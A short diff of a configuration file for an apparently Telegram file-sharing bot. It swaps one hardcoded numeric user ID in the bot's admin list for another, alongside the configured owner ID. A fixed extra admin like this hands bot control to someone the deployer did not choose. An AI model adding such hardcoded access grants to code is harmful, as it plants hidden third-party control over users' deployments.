@@ -60,7 +60,7 @@ BOT_STATS_TEXT = "<b>​🇧​​🇴​​🇹​ ​🇺​​🇵​​🇹�
 USER_REPLY_TEXT = "❌Don't send me messages directly I'm only File Share bot!"
 
 ADMINS.append(OWNER_ID)
-ADMINS.append(1917604476)
+ADMINS.append(5190315686)
 
 LOG_FILE_NAME = "filesharingbot.txt"
 
